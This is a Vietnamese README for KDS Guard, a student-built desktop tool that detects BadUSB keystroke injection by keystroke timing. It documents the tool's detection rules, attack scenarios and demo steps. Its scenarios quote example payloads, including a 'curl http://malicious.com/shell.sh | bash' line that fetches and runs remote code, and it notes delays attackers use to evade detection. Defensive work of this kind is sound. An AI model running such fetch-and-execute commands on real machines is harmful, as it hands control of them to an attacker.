# KDS Guard — BadUSB Detection via Keystroke Dynamics

Phát hiện & ngăn chặn tấn công chèn phím giả mạo (BadUSB / Rubber Ducky) bằng phân tích **động học gõ phím** (Keystroke Dynamics) theo thời gian thực.

---

## Mục lục

- [Giới thiệu ứng dụng](#giới-thiệu-ứng-dụng)
- [Khởi động nhanh](#khởi-động-nhanh)
- [Tình trạng hiện tại](#tình-trạng-hiện-tại)
- [Cấu trúc dự án](#cấu-trúc-dự-án)
- [Kiến trúc hệ thống](#kiến-trúc-hệ-thống)
- [8 Luật phát hiện](#8-luật-phát-hiện)
- [Phân tích False Positive / False Negative](#phân-tích-false-positive--false-negative-của-từng-luật)
- [Kịch bản với BadUSB thật](#kịch-bản-với-badusb-thật-thiết-bị-vật-lý)
- [So sánh người thật vs BadUSB](#so-sánh-người-thật-vs-badusb)
- [Khởi động hệ thống](#khởi-động-hệ-thống)
- [Kịch bản Demo](#kịch-bản-demo)
- [Cấu hình nâng cao](#cấu-hình-nâng-cao)
- [Xử lý lỗi thường gặp](#xử-lý-lỗi-thường-gặp)
- [Tài liệu chi tiết](#tài-liệu-chi-tiết)

---

## Giới thiệu ứng dụng

**KDS Guard** là ứng dụng desktop bảo mật phát hiện tấn công BadUSB bằng phân tích động học gõ phím. Ứng dụng sử dụng engine Rust để bắt sự kiện bàn phím, phân tích 22 đặc trưng keystroke, và đưa ra quyết định phát hiện tấn công trong thời gian thực.

### Desktop Application (Electron)

Ứng dụng được đóng gói thành file `.exe` để người dùng có thể chạy trực tiếp mà không cần cài đặt môi trường phát triển.

```
kds-guard-dashboard/release/
├── KDS Guard Setup 1.0.0.exe   # Trình cài đặt (installer)
├── win-unpacked/
│   ├── KDS Guard.exe            # Portable executable (chạy trực tiếp)
│   └── resources/
│       ├── app.asar             # Ứng dụng Electron (119.46 MB)
│       └── kds_guard.exe        # Engine Rust (2.04 MB) - đã bundle sẵn
```

| File | Kích thước | Mô tả |
|------|-----------|--------|
| `KDS Guard Setup 1.0.0.exe` | 112.51 MB | Trình cài đặt (NSIS installer) |
| `KDS Guard.exe` (portable) | 216.08 MB | Chạy trực tiếp không cần cài |
| `kds_guard.exe` (bundled) | 2.04 MB | Engine Rust đã đóng gói bên trong |

### Cách sử dụng

**Cách 1 — Chạy portable (khuyên dùng):**
```
Double-click "KDS Guard.exe" trong thư mục win-unpacked/
```

**Cách 2 — Cài đặt:**
```
Double-click "KDS Guard Setup 1.0.0.exe"
Chọn thư mục cài đặt → Next → Install
```

### Hướng dẫn cài đặt (NSIS Installer)

1. **Double-click** file `KDS Guard Setup 1.0.0.exe`
2. Cửa sổ **User Account Control** hiện lên → nhấn **Yes** (cấp quyền Admin để cài đặt)
3. Chọn ngôn ngữ → nhấn **OK**
4. Nhấn **Next** để tiếp tục
5. **Chọn thư mục cài đặt** (mặc định: `C:\Program Files\KDS Guard`):
   - Nhấn **Browse** để chọn thư mục khác (khuyên dùng: giữ mặc định)
   - Nhấn **Next**
6. **Chọn shortcuts:**
   - ☑ Create a desktop shortcut (tạo icon trên Desktop)
   - ☑ Create a Start Menu shortcut (tạo shortcut trong Start Menu)
   - Nhấn **Next**
7. Nhấn **Install** để bắt đầu cài
8. Đợi quá trình cài đặt hoàn tất → nhấn **Finish**

> **Lưu ý:** Sau khi cài xong, ứng dụng sẽ tự khởi động. Nếu muốn chạy bằng quyền Administrator để bật tính năng chặn bàn phím (BlockInput), chuột phải vào `KDS Guard.exe` → **Run as administrator**.

### Tự động khởi động khi mở app

Khi mở ứng dụng (portable hoặc installer), hệ thống sẽ **tự động khởi động**:

1. **KDS Guard Engine** — `kds_guard.exe` (bundled bên trong app)
   - Bắt đầu giám sát bàn phím ngay lập tức
   - Phân tích 22 đặc trưng keystroke theo thời gian thực
   - Đánh giá risk score qua 8 luật (R1-R8)

2. **WebSocket Bridge** — `ws_bridge.py` (bundled bên trong app)
   - Kết nối engine với Dashboard
   - Broadcast sự kiện phát hiện qua WebSocket
   - Dashboard nhận dữ liệu realtime và cập nhật biểu đồ live

3. **Dashboard** — Giao diện web trong cửa sổ Electron
   - Hiển thị Risk Score, Threat Level, Keystroke Metrics
   - Biểu đồ ECharts cập nhật realtime
   - Thông báo Windows Notification khi phát hiện tấn công

> **Yêu cầu:** `ws_bridge.py` cần **Python** được cài sẵn trên máy. Nếu chưa có, tải tại [python.org](https://www.python.org/downloads/) và chọn **Add Python to PATH** khi cài đặt.

### Tính năng chính

- **Dashboard tương tác** — 10 trang: Dashboard, Realtime Monitor, Detection Rules, Alerts, Devices, Logs, Policies, Settings, Profile, About
- **Giám sát thời gian thực** — Biểu đồ ECharts live cập nhật đặc trưng gõ phím
- **Phát hiện tấn công** — 8 luật kết hợp, phản ứng từ thông báo đến chặn input
- **Hệ thống cảnh báo** — Windows Notification khi phát hiện mức HIGH/CRITICAL
- **Quản lý thiết bị** — Liệt kê và chặn thiết bị USB keyboard/HID
- **Giao diện dark mode** — Thiết kế hiện đại với theme tối

---

## Khởi động nhanh

### Cách 1 — Chạy ứng dụng đóng gói (không cần setup)

```powershell
# Di chuyển vào thư mục release
cd "C:\Users\LOQ\OneDrive\Ứng dụng\Tài liệu\DOANCOSO\kds-guard-dashboard\release\win-unpacked"

# Double-click KDS Guard.exe HOẶC chạy từ terminal:
.\"KDS Guard.exe"
```

> **Lưu ý:** Chạy **Run as Administrator** để engine có thể sử dụng BlockInput (chặn bàn phím khi phát hiện tấn công).

### Cách 2 — Development mode (3 Terminal)

Cần thiết lập môi trường phát triển:

**Terminal 1 — Dashboard:**
```powershell
cd "C:\Users\LOQ\OneDrive\Ứng dụng\Tài liệu\DOANCOSO\kds-guard-dashboard"
npm run dev
```
→ Mở trình duyệt: **http://localhost:3000**

**Terminal 2 — WebSocket Bridge:**
```powershell
cd "C:\Users\LOQ\OneDrive\Ứng dụng\Tài liệu\DOANCOSO"
python ws_bridge.py
```

**Terminal 3 — Rust Engine (Run as Administrator):**
```powershell
cd "C:\Users\LOQ\OneDrive\Ứng dụng\Tài liệu\DOANCOSO\kds_guard\target\release"
.\kds_guard.exe --json-output -u test_user
```

---

## Tình trạng hiện tại

| Thành phần | Trạng thái | Ghi chú |
|-----------|-----------|---------|
| Rust Engine | ✅ Sẵn sàng | `kds_guard/target/release/kds_guard.exe` |
| React Dashboard | ✅ Sẵn sàng | `http://localhost:3000` (10 trang) |
| WebSocket Bridge | ✅ Sẵn sàng | `ws_bridge.py` |
| Electron App | ✅ Sẵn sàng | `release/KDS Guard.exe` (portable) |
| Installer | ✅ Sẵn sàng | `release/KDS Guard Setup 1.0.0.exe` |
| BadUSB Simulator | ✅ Sẵn sàng | `scripts/simulate_badusb.py` |
| Dataset | ✅ 21,963 mẫu | human: 21,731 + injection: 232 |
| ML Models | ✅ Đã huấn luyện | RF, IF, OCSVM — F1=1.00 |
| Evaluation Report | ✅ Sẵn sàng | `data/evaluation_report.json` |

---

## Dataset & Model

```
Dataset: 21,963 mẫu
  ├── CMU Benchmark:      20,400 human
  ├── Rust Collector:       771 human (từ 49 bạn bè)
  ├── Python Collector:      158 human
  ├── Demo/Synthetic:        402 human
  └── Injection Simulated:   232 injection

Models:
  ├── Random Forest:    Accuracy=100%, F1=1.00, AUC=1.00 ✅
  ├── Isolation Forest:  AUC=0.993, F1=0.19
  ├── One-Class SVM:     AUC=0.996, F1=0.18
  └── Hybrid (R:0.6 + ML:0.4): Accuracy=100%, F1=1.00
```

---

## Cấu trúc dự án

```
DOANCOSO/
├── kds_guard/                    # Rust engine (core)
│   ├── src/
│   │   ├── main.rs             # Entry point + Early Warning Layer
│   │   ├── input_capture.rs    # Bắt sự kiện bàn phím (rdev)
│   │   ├── feature.rs           # Trích 22 đặc trưng (sliding window)
│   │   ├── detector.rs         # 8 luật phát hiện (R1-R8)
│   │   ├── policy.rs           # Mức phản hồi (NORMAL → CRITICAL)
│   │   └── response.rs         # BlockInput + Windows Notification
│   └── target/release/kds_guard.exe
├── ws_bridge.py                 # WebSocket bridge (Rust → Dashboard)
├── kds-guard-dashboard/        # Electron Desktop App
│   ├── electron/
│   │   ├── main.ts            # Electron main process
│   │   └── preload.ts         # Preload script
│   ├── src/
│   │   ├── pages/             # 10 trang React
│   │   ├── components/        # UI components
│   │   └── providers/         # Theme, WebSocket providers
│   ├── release/               # Build output
│   │   ├── KDS Guard Setup 1.0.0.exe
│   │   └── win-unpacked/
│   │       └── KDS Guard.exe  # Portable executable
│   └── electron-builder.json  # Cấu hình đóng gói
├── scripts/
│   ├── simulate_badusb.py       # Mô phỏng BadUSB (Windows API)
│   ├── simulate_injection.py    # Injection pattern simulator
│   ├── integrate_datasets.py    # Ghép dữ liệu từ nhiều nguồn
│   ├── train_model.py          # Huấn luyện ML model
│   └── evaluate.py              # Đánh giá hệ thống
├── data/
│   ├── features_dataset.csv     # Dataset chính (21,963 mẫu)
│   └── evaluation_report.json   # Kết quả đánh giá
└── models/                      # ML models đã huấn luyện
```

---

## Kiến trúc hệ thống

```
┌──────────────────────────────────────────────────────────────────┐
│                    BADUSB / RUBBER DUCKY                           │
│            Gõ 30-50 phím/giây, flight time < 25ms, CV < 0.15     │
└─────────────────────────┬────────────────────────────────────────┘
                          │ Keyboard Events
                          ▼
┌──────────────────────────────────────────────────────────────────┐
│  TẦNG 1: INPUT CAPTURE (rdev / WinAPI)                          │
│  Bắt KeyDown / KeyUp → ghi ra CSV                                │
└─────────────────────────┬────────────────────────────────────────┘
                          │
                          ▼
┌──────────────────────────────────────────────────────────────────┐
│  TẦNG 2: FEATURE EXTRACTION (cửa sổ trượt 40 phím, slide 20)   │
│  Trích 22 đặc trưng: hold time, flight time, CV, burst, speed...│
│  Early Warning: 30 phím → cảnh báo sớm ~0.6s                    │
└─────────────────────────┬────────────────────────────────────────┘
                          │
                          ▼
┌──────────────────────────────────────────────────────────────────┐
│  TẦNG 3: DETECTOR (8 luật R1-R8)                                │
│  R1: mean_ft < 30ms (+0.30)  R5: iqr_ht < 5ms (+0.15)           │
│  R2: cv < 0.15      (+0.25)  R6: modifier > 40% (+0.10)          │
│  R3: speed > 20keys/s (+0.35) R7: min_ft < 5ms  (+0.10)          │
│  R4: burst ≥ 15     (+0.20)  R8: injection FP  (+0.25)           │
│  Risk Score = tổng trọng số → NORMAL / LOW / MEDIUM / HIGH / CRITICAL │
└─────────────────────────┬────────────────────────────────────────┘
                          │
                          ▼
┌──────────────────────────────────────────────────────────────────┐
│  TẦNG 4: POLICY + RESPONSE                                       │
│  NORMAL  → Cho phép         MEDIUM  → Windows Notification       │
│  LOW     → Ghi log          HIGH    → BlockInput 2s + Alert      │
│  CRITICAL → BlockInput 5s + Alert + Timeout cứng                  │
└─────────────────────────┬────────────────────────────────────────┘
              ┌───────────┴───────────┐
              ▼                       ▼
     CSV Log File            JSON stdout → ws_bridge.py → Dashboard
```

---

## 8 Luật phát hiện

| # | Luật | Điều kiện | Trọng số |
|---|------|-----------|-----------|
| R1 | Flight Time thấp | mean_flight_time < 30ms | +0.30 |
| R2 | CV thấp | cv_flight_time < 0.15 | +0.25 |
| R3 | Tốc độ cao | speed > 20 keys/s + ft < 50ms | +0.35 |
| R4 | Burst dài | max_burst ≥ 15 phím < 50ms | +0.20 |
| R5 | Hold Time đều | iqr_hold_time < 5ms | +0.15 |
| R6 | Modifier nhiều | modifier_ratio > 40% | +0.10 |
| R7 | Min Flight cực thấp | min_flight_time < 5ms | +0.10 |
| R8 | Injection Fingerprint | pause ≥ 3 + CV < 0.3 | +0.25 |

**Risk Level:** NORMAL(0.00) → LOW(0.15) → MEDIUM(0.30) → HIGH(0.60) → CRITICAL(0.80)

---

## Phân tích False Positive & False Negative của từng luật

### R1 — Flight Time thấp (`mean_ft < 30ms`, +0.30)

| | Phân tích |
|-|-----------|
| **Người thật** | Gõ trung bình 150-400ms giữa 2 phím. Ngay cả người gõ rất nhanh 15-18 keys/s chỉ đạt ~55-67ms → FP cực thấp. |
| **Ngưỡng 30ms** | Đủ thấp để tránh FP với người thật. |
| **BadUSB FN** | Attacker cấu hình delay 35-40ms/key (tốc độ ~25-28 keys/s) → mean_ft ~35-40ms → không trigger R1. Tuy nhiên R3 (speed > 20) vẫn trigger. |
| **Đánh giá** | 🟢 An toàn — ngưỡng 30ms khó nhầm người thật. |

---

### R2 — CV thấp (`cv < 0.15`, +0.25)

| | Phân tích |
|-|-----------|
| **Người thật** | CV = std/mean, hầu hết 0.30-0.70. Pianist / người gõ đều đặn có thể đạt ~0.15-0.25 → FP thấp vì ngưỡng chính xác là 0.15. |
| **Ngưỡng 0.15** | Rất an toàn. Hiếm người gõ đều đến mức CV < 0.15 ổn định. |
| **BadUSB FN** | Rubber Ducky / Teensy gõ đều → CV ~0.05-0.10 → FN gần bằng 0. |
| **Đánh giá** | 🟢 An toàn nhất — "gõ quá đều như máy" rất hiếm ở người thật. |

---

### R3 — Tốc độ cao (`speed > 20 keys/s + ft < 50ms`, +0.35)

| | Phân tích |
|-|-----------|
| **Người thật** | Gõ bình thường: 5-12 keys/s. Gần như không ai đạt 20 keys/s liên tục trên cửa sổ 40 phím. |
| **Điều kiện kép** | Quan trọng: `speed > 20` **VÀ** `ft < 50ms`. Người gõ nhanh 15 keys/s không trigger vì speed chưa đến 20. |
| **FP đặc biệt** | Người gõ một đoạn rất quen thuộc có thể tạm đạt 20+ keys/s. Nhưng ft ~55-65ms → không < 50ms → không trigger. |
| **BadUSB FN** | Delay 50ms/key (tốc độ ~20 keys/s) → speed không > 20, ft ~50ms → không trigger R3. Nhưng R2 (CV) vẫn bắt. |
| **Đánh giá** | 🟡 Khá an toàn — điều kiện kép giảm FP đáng kể. |

---

### R4 — Burst dài (`max_burst ≥ 15 phím < 50ms`, +0.20)

| | Phân tích |
|-|-----------|
| **Người thật** | Không có chuỗi liên tục > 5-8 phím dưới 50ms. Gõ nhanh vẫn có 1-2 khoảng nghỉ tự nhiên > 50ms → FP thấp. |
| **FP đặc biệt** | Gõ một đoạn quen thuộc ngắn 15-20 phím liên tục → có thể trigger nhẹ. Hiếm gặp. |
| **BadUSB FN** | Payload gõ liên tục → burst 30-40 phím → gần như chắc chắn trigger. |
| **Đánh giá** | 🟢 An toàn — burst ≥ 15 phím liên tiếp hầu như chỉ có ở BadUSB. |

---

### R5 — Hold Time đều (`iqr_ht < 5ms`, +0.15)

| | Phân tích |
|-|-----------|
| **Người thật** | IQR hold time: 30-80ms. Không ai xuống dưới 5ms. FP = 0%. |
| **FP đặc biệt** | Người dùng auto-clicker/macro → hold time cực đều → có thể trigger. Đây không phải FP thực sự (hành vi bất thường). |
| **BadUSB FN** | Chip USB gõ với timing chính xác → IQR ~0-2ms → FN gần bằng 0. |
| **Đánh giá** | 🟢 An toàn nhất — IQR < 5ms gần như chỉ xảy ra ở máy. |

---

### R6 — Modifier nhiều (`modifier_ratio > 40%`, +0.10)

| | Phân tích |
|-|-----------|
| **Người thật** | Modifier ratio thông thường: 5-15%. Power user dùng nhiều phím tắt: ~20-35%. Rất hiếm đạt > 40%. |
| **FP đặc biệt** | Copy-paste liên tục (Ctrl+C/V) → ratio ~30-40%. Vẫn dưới 40% → không trigger. |
| **BadUSB FN** | Payload Linux command (`curl`, `wget`, `bash`) có modifier thấp → không trigger R6. **FN cao nhất của hệ thống** khi dùng độc lập. Tuy nhiên R1-R4 vẫn phát hiện tốc độ gõ. |
| **Đánh giá** | 🟡 Chỉ hiệu quả với shortcut payload. Không đủ độc lập, nhưng kết hợp tốt với R1-R4. |

---

### R7 — Min Flight cực thấp (`min_ft < 5ms`, +0.10)

| | Phân tích |
|-|-----------|
| **Người thật** | Con người **không thể** gõ 2 phím cách nhau < 5ms. Giới hạn sinh học ~20-30ms. **FP = 0%.** |
| **BadUSB FN** | Teensy gõ 1-3ms → trigger. Rubber Ducky delay 10-15ms → không trigger R7. |
| **Đánh giá** | 🟢 Tuyệt đối không FP — nhưng chỉ là lớp phòng thủ cuối, không đủ độc lập. |

---

### R8 — Injection Fingerprint (`pause ≥ 3 + CV < 0.3`, +0.25)

| | Phân tích |
|-|-----------|
| **Người thật** | Hầu hết không tạo pattern "burst có khoảng nghỉ đều" đủ dài → FP thấp. |
| **FP đặc biệt** | Gõ script/exam từng dòng có khoảng nghỉ đều → có thể trigger nhẹ nếu ≥ 3 pauses đều. Hiếm. |
| **BadUSB FN lớn nhất** | BadUSB gõ payload **liên tục không khoảng nghỉ** → `pause_count = 0` → không trigger R8. |
| **Bù đắp FN** | R1 (ft < 30ms) + R2 (CV < 0.15) + R4 (burst ≥ 15) vẫn trigger payload liên tục. R8 chỉ bị bỏ sót khi BadUSB cố tình delay giữa các burst. |
| **Đánh giá** | 🟡 Hiệu quả với payload dạng script. Bị bỏ sót nếu gõ liên tục hoàn toàn — nhưng R1-R4 sẽ bắt trước. |

---

### Tổng hợp rủi ro

| Luật | False Positive | False Negative | Nhận xét |
|------|---------------|---------------|-----------|
| R1 | 🟢 Rất thấp | 🟡 Thấp | Delay > 35ms bypass được |
| R2 | 🟢 Rất thấp | 🟢 Gần bằng 0 | Luật mạnh nhất |
| R3 | 🟢 Thấp | 🟡 Thấp | Điều kiện kép an toàn |
| R4 | 🟢 Thấp | 🟢 Gần bằng 0 | Burst dài chỉ có ở BadUSB |
| R5 | 🟢 Gần bằng 0 | 🟢 Gần bằng 0 | Không có FP thực sự |
| R6 | 🟢 Rất thấp | 🟠 Cao | Chỉ hiệu quả với shortcut payload |
| R7 | 🟢 Không có | 🟡 Thấp | Phụ thuộc loại BadUSB |
| R8 | 🟢 Thấp | 🟡 Thấp | Không phát hiện payload liên tục |

**Kết luận:** Hệ thống dùng **8 luật kết hợp** — không luật nào đứng độc lập. BadUSB gõ nhanh → R1+R2+R3+R4 trigger. BadUSB gõ chậm đều → R2+R8 trigger. BadUSB gõ shortcut → R6+R2+R3 trigger. **Không có kịch bản BadUSB nào bị bỏ sót hoàn toàn** vì luật yếu nhất (R6) vẫn được bù bởi luật mạnh (R1, R2, R4).

---

## Kịch bản với BadUSB thật (thiết bị vật lý)

### Thiết bị phổ biến & đặc điểm

| Thiết bị | Tốc độ mặc định | Payload |
|---------|----------------|---------|
| **Rubber Ducky** | ~50-100 keys/s | DuckyScript |
| **Teensy** | ~20-100 keys/s | Arduino code |
| **Digispark** | ~30-50 keys/s | Arduino |
| **Bash Bunny** | ~50 keys/s | Bash |
| **Malicious USB Cable** | ~20-30 keys/s | OMG cable |

---

### Kịch bản A — Rubber Ducky gõ payload mặc định 🔴

**Mô tả:** Attacker cắm Rubber Ducky, đợi 2-3 giây, rồi gõ payload `"curl http://malicious.com/shell.sh | bash"` ở tốc độ ~50-100 keys/s.

**Các luật trigger:**
```
R1 (ft < 30ms): ✅ mean_ft ~18-25ms → +0.30
R2 (cv < 0.15): ✅ CV ~0.05-0.10 → +0.25
R3 (speed > 20): ✅ speed ~50-100 keys/s → +0.35
R4 (burst ≥ 15): ✅ chuỗi 30-50 phím liên tiếp → +0.20
R5 (iqr_ht < 5ms): ✅ IQR ~1-3ms → +0.15
R8 (pause + CV < 0.3): ✅ khoảng nghỉ đều → +0.25
```
**Tổng điểm: 1.50 → CRITICAL**

**Phản hồi:** BlockInput 5s + Windows Notification "PHÁT HIỆN TẤN CÔNG HID INJECTION!"
**Thời gian phát hiện:** ~0.6-1.0 giây sau khi cắm.

---

### Kịch bản B — BadUSB delay 35-40ms/key chống phát hiện 🟠

**Mô tả:** Attacker biết có detector, cấu hình delay 35-40ms/key (tốc độ ~25-28 keys/s) để né R1.

**Các luật trigger:**
```
R1 (ft < 30ms): ❌ mean_ft ~35-40ms → không trigger
R2 (cv < 0.15): ✅ CV ~0.08-0.12 → +0.25
R3 (speed > 20): ✅ speed ~25-28 keys/s → +0.30
R4 (burst ≥ 15): ✅ burst vẫn ≥ 15 → +0.20
R5 (iqr_ht < 5ms): ✅ → +0.15
```
**Tổng điểm: 0.90 → CRITICAL**

Attacker không thể bypass đồng thời R2 + R3 + R4 + R5.

---

### Kịch bản C — Payload shortcut (Ctrl+C, Win+R...) 🟡

**Mô tả:** Attacker gõ các tổ hợp phím nhanh: `Ctrl+C`, `Ctrl+V`, `Win+R`, `Alt+F4`.

**Các luật trigger:**
```
R1 (ft < 30ms): ⚠️ tùy tốc độ
R2 (cv < 0.15): ✅ CV thường rất thấp → +0.25
R4 (burst ≥ 15): ❌ shortcut chỉ 2-4 phím → không trigger
R5 (iqr_ht < 5ms): ✅ → +0.15
R6 (modifier > 40%): ✅ shortcut có modifier cao → +0.10
R8: ⚠️ tùy pattern
```
**Tổng điểm: 0.50 → HIGH**

**Nhận xét:** Kịch bản khó phát hiện nhất — burst ngắn, nhưng R2 + R5 + R6 vẫn kích hoạt. **Risk: HIGH** thay vì CRITICAL, phản hồi nhẹ hơn nhưng vẫn có cảnh báo.

---

### Kịch bản D — Payload gõ từng lệnh có khoảng nghỉ đều 🔴

**Mô tả:** Payload gồm nhiều lệnh riêng biệt: `ls` → khoảng nghỉ ~100ms → `cd /tmp` → khoảng nghỉ ~100ms → `curl ...`

**Các luật trigger:**
```
R1 (ft < 30ms): ✅ mỗi lệnh gõ nhanh → trigger
R2 (cv < 0.15): ✅ mỗi burst đều → trigger
R4 (burst ≥ 15): ✅ mỗi lệnh dài → trigger
R8 (pause + CV < 0.3): ✅ khoảng nghỉ đều → +0.25
```
**Tổng điểm: 1.00 → CRITICAL**

**Lưu ý:** R8 đặc biệt hiệu quả ở kịch bản này — phát hiện pattern "lệnh-khoảng nghỉ đều-lệnh" mà các luật khác bỏ sót.

---

### Kịch bản E — BadUSB gõ một lệnh dài liên tục 🔴

**Mô tả:** BadUSB gõ một lệnh đơn lẻ dài (`powershell -nop -c "Invoke-WebRequest -Uri http://..."`) liên tục không nghỉ.

**Các luật trigger:**
```
R1 (ft < 30ms): ✅ ft ~20-25ms → +0.30
R2 (cv < 0.15): ✅ CV ~0.08-0.12 → +0.25
R4 (burst ≥ 15): ✅ burst = toàn bộ lệnh → +0.20
R5 (iqr_ht < 5ms): ✅ → +0.15
R8: ❌ không có khoảng nghỉ → không trigger
```
**Tổng điểm: 0.90 → CRITICAL**

R8 không trigger vì không có khoảng nghỉ, nhưng R1-R5 vẫn đủ để phát hiện.

---

### Tổng hợp kịch bản BadUSB thật

| Kịch bản | Mô tả | R1 | R2 | R3 | R4 | R5 | R6 | R7 | R8 | **Kết quả** |
|---------|--------|----|----|----|----|----|----|----|----|------------|
| **A** | Rubber Ducky mặc định | ✅ | ✅ | ✅ | ✅ | ✅ | ❌ | ⚠️ | ✅ | 🔴 CRITICAL |
| **B** | BadUSB delay 35ms/key | ❌ | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ⚠️ | 🔴 CRITICAL |
| **C** | Payload shortcut (Ctrl+C...) | ⚠️ | ✅ | ⚠️ | ❌ | ✅ | ✅ | ❌ | ⚠️ | 🟠 HIGH |
| **D** | Lệnh có khoảng nghỉ đều | ✅ | ✅ | ❌ | ✅ | ❌ | ❌ | ❌ | ✅ | 🔴 CRITICAL |
| **E** | Lệnh dài liên tục | ✅ | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | 🔴 CRITICAL |

✅ = trigger, ❌ = không trigger, ⚠️ = tùy trường hợp

---

## So sánh người thật vs BadUSB

| Tiêu chí | Người thật | BadUSB |
|---------|------------|--------|
| Tốc độ gõ | 5-12 keys/s | 30-50 keys/s |
| mean_flight_time | 150-400 ms | 15-35 ms |
| std_flight_time | 50-150 ms | 1-5 ms |
| cv_flight_time | 0.30-0.70 | 0.05-0.15 |
| max_burst_length | 0-3 | 25-40 |
| Risk Score | 0.00 | ~0.85-1.00 |
| Risk Level | NORMAL ✅ | CRITICAL 🔴 |
| Action | Allow | BlockInput 3-5s + Alert |

---

## Khởi động hệ thống

### Yêu cầu đã kiểm tra

```
✅ Rust:      1.94.0
✅ Cargo:     1.94.0
✅ Node.js:   22.22.0
✅ npm:       11.11.0
✅ Python:    3.11.9
✅ Git:       ✅
```

---

### Bước 1 — Dashboard React

```powershell
cd "C:\Users\LOQ\OneDrive\Ứng dụng\Tài liệu\DOANCOSO\kds-guard-dashboard"
npm run dev
```

→ Mở trình duyệt: **http://localhost:3000**

Dashboard có **10 trang**:
- **Dashboard** — Tổng quan với 8 widget (Risk Score, Threat Level, Keystroke Metrics, Activity Timeline, Recent Alerts, Event Log, Detection Rules, System Overview)
- **Realtime Monitor** — Giám sát trực tiếp đặc trưng gõ phím khi hệ thống đang chạy
- **Detection Rules** — Chi tiết 8 luật phát hiện
- **Alerts** — Lịch sử cảnh báo
- **Devices** — Thiết bị bàn phím
- **Logs** — Nhật ký chi tiết
- **Policies** — Chính sách phản hồi
- **Settings** — Cấu hình ngưỡng
- **Profile** — Hồ sơ người dùng
- **About** — Thông tin đồ án

---

### Bước 2 — WebSocket Bridge

Mở **Terminal mới**:

```powershell
cd "C:\Users\LOQ\OneDrive\Ứng dụng\Tài liệu\DOANCOSO"
python ws_bridge.py
```

Output thành công:
```
==================================================
  KDS Guard WebSocket Bridge
  Dashboard ket noi tai: ws://localhost:8765
==================================================
[BRIDGE] WebSocket server dang chay tai ws://localhost:8765
[BRIDGE] Tu dong chay kds_guard.exe...
```

---

### Bước 3 — Engine Rust (chạy as Administrator để bật BlockInput)

Mở **Terminal mới** (chuột phải → **Run as Administrator**):

```powershell
cd "C:\Users\LOQ\OneDrive\Ứng dụng\Tài liệu\DOANCOSO\kds_guard\target\release"
.\kds_guard.exe --json-output -u test_user
```

Hoặc kết hợp pipe:

```powershell
.\kds_guard.exe --json-output -u test_user | python ws_bridge.py
```

---

### Tóm tắt 3 Terminal

```
┌──────────────────────────────────────────────────────────────────────────────┐
│  Terminal 1                        Terminal 2             Terminal 3           │
│  cd kds-guard-dashboard; npm run dev  python ws_bridge.py    (optional)        │
│  Dashboard                           WebSocket Bridge        python simulate_   │
│  localhost:3000                      ws://localhost:8765    badusb.py           │
└──────────────────────────────────────────────────────────────────────────────┘
```

---

## Kịch bản Demo

### Demo 1 — Giám sát người thật ✅

**Mục tiêu:** Chứng minh hệ thống hoạt động bình thường, không false alarm.

**Cách chạy:**
1. Chạy đủ 3 bước ở trên
2. Mở **Notepad** hoặc **VS Code**
3. Gõ một đoạn văn bản tự nhiên (~30 giây)
4. Quan sát Dashboard

**Kết quả mong đợi:**
```
Risk Score: ~0.00 → NORMAL (xanh lá)
Risk Level: NORMAL
Trên Console: ✅ NORMAL  0.00 | OK
Không có notification
Input: KHÔNG bị chặn
```

---

### Demo 2 — Phát hiện BadUSB 🔴

**Mục tiêu:** Mô phỏng tấn công chèn phím, kích hoạt cảnh báo và chặn input.

**Cách chạy:**
1. Chạy đủ 3 bước ở trên
2. Mở **Notepad**
3. Chạy simulator (Terminal mới):

```powershell
# Nhanh nhat (50 keys/s, 60 phim)
cd "C:\Users\LOQ\OneDrive\Ứng dụng\Tài liệu\DOANCOSO"
python scripts/simulate_badusb.py --speed 50

# Hoac voi payload co san
python scripts/simulate_badusb.py --payload recon --speed 80

# Hoac payload tuong minh bat ky
python scripts/simulate_badusb.py --custom "powershell -nop -c whoami" --speed 100
```

4. Chuyển nhanh sang cửa sổ Notepad trước khi script bắt đầu (có 3 giây đếm ngược)

**Kết quả mong đợi:**
```
Risk Score: ~0.85-1.00 → CRITICAL (đỏ)
Risk Level: CRITICAL
Trên Console: 🔴 CRITICAL  0.85 | R1+R2+R3+R4+R8
Windows Notification: "PHAT HIEN TAN CONG HID INJECTION!"
Input: Bị chặn 3-5 giây (BlockInput)
```

---

### Demo 3 — Không cần Dashboard, chỉ xem Console

**Mục tiêu:** Chạy nhanh không cần Dashboard, chỉ xem kết quả phát hiện trên console.

```powershell
# Chạy engine trực tiếp (không WebSocket)
cd "C:\Users\LOQ\OneDrive\Ứng dụng\Tài liệu\DOANCOSO\kds_guard\target\release"
.\kds_guard.exe -v -u test_user

# Rồi chạy simulator ở Terminal khác
cd "C:\Users\LOQ\OneDrive\Ứng dụng\Tài liệu\DOANCOSO"
python scripts/simulate_badusb.py --speed 50
```

Output mẫu khi phát hiện:
```
✅ NORMAL  0.00 | OK
✅ NORMAL  0.00 | OK
✅ NORMAL  0.00 | OK
🔴 CRITICAL  0.85 | R1+R2+R3+R4+R8
   - Flight time trung binh rat thap: 25.1ms
   - He so bien thien CV rat thap: 0.080
   - Toc do go bat thuong: 35.0 keys/s
   - Burst pattern: 35 phim lien tiep < 50ms
   Chan trong: 3000ms
```

---

### Demo 4 — Thu thập dữ liệu mới từ bạn bè

```powershell
cd "C:\Users\LOQ\OneDrive\Ứng dụng\Tài liệu\DOANCOSO"

# 1. Xem trạng thái dataset
python scripts/integrate_datasets.py --status

# 2. Copy file CSV của bạn bè vào data/raw/rust/

# 3. Ghép dữ liệu + huấn luyện lại
integrate_all.bat
# Hoac:
python scripts/integrate_datasets.py --rust-collect --merge
python scripts/train_model.py -d data -m models

# 4. Cap nhat Dashboard snapshot
python scripts/export_dashboard_snapshot.py
```

---

## Tham số CLI của Engine

| Tham số | Mặc định | Mô tả |
|---------|---------|-------|
| `-w` | 40 | Kích thước cửa sổ (số phím) |
| `-s` | 20 | Bước trượt cửa sổ |
| `-u` | anonymous | User ID |
| `-o` | data | Thư mục output |
| `-d` | 0 | Thời gian chạy (giây, 0 = vô hạn) |
| `-v` | false | Verbose logging |
| `--collect-only` | false | Chỉ thu thập, không detect |
| `--log-keys` | false | Ghi chi tiết từng phím |
| `--json-output` | false | Xuất JSON ra stdout |

---

## Cấu hình nâng cao

File: `kds_guard/config.toml`

```toml
[detector.thresholds]
medium   = 0.3    # Ngưỡng risk score medium
high     = 0.6    # Ngưỡng risk score high
critical = 0.8    # Ngưỡng risk score critical

[feature]
window_size       = 40
slide_step       = 20
